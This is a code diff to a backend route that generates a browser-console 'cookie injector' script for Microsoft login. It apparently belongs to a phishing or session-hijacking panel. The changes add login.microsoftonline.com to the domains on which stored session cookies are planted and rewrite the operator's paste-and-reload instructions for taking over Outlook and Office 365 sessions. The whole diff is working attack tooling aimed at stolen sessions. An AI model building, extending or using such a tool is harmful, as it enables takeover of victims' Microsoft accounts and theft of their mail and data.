@@ -131,11 +131,13 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     // Build a complete script with domain and path attributes
     const lines = [
       '// VGenius Cookie Injector for Microsoft Login',
+      '',
       '// Instructions:',
-      '// 1. Open https://login.microsoftonline.com in Chrome/Edge',
-      '// 2. Press F12 -> Go to Console tab',
-      '// 3. Paste this script and press Enter',
-      '// 4. Wait ~3 seconds for redirect',
+      '// 1. Navigate to https://outlook.office365.com/',
+      '// 2. When prompted to sign in, click "Cancel" or "No"',
+      '// 3. Press F12 -> Go to Console tab',
+      '// 4. Paste this entire script and press Enter',
+      '// 5. The page will automatically reload with your session cookies',
       ''
     ];
     
@@ -145,16 +147,19 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       const cookieName = name.trim();
       const cookieValue = valueParts.join('=').trim();
       if (cookieName && cookieValue) {
+        // Set cookies for multiple Microsoft domains
         lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=.microsoft.com; secure; SameSite=None";`);
         lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=.office.com; secure; SameSite=None";`);
         lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=outlook.office365.com; secure; SameSite=None";`);
+        lines.push(`document.cookie = "${cookieName}=${cookieValue}; path=/; domain=login.microsoftonline.com; secure; SameSite=None";`);
       }
     });
     
-    // Add redirect
+    // Add reload instruction instead of redirect (sandboxed iframe can't redirect)
     lines.push('');
-    lines.push('console.log("✅ All cookies injected! Redirecting to Outlook...");');
-    lines.push('setTimeout(() => { window.location.href = "https://outlook.office365.com/"; }, 1500);');
+    lines.push('// ✅ All cookies injected successfully!');
+    lines.push('console.log("%c✅ All cookies injected!", "color: #00ff00; font-size: 16px; font-weight: bold;");');
+    lines.push('console.log("%c📌 Please refresh the page (press F5) to apply your session.", "color: #ffff00; font-size: 12px;");');
     
     const script = lines.join('\n');
     
